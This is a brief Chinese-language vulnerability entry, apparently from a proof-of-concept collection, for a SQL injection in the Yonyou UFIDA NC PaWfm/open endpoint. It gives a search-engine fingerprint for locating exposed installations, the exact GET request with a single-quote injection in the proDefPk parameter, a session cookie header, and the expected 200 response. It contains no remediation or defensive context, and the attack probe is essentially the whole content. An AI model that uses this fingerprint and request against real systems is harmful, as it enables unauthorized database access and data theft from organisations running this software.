# 用友NCPaWfmopen存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /portal/pt/PaWfm/open?pageId=login&proDefPk=1' HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=7717AB57F8AD7F26C97F76F77D494F04.ncMem01`
- **预期**：200　|　—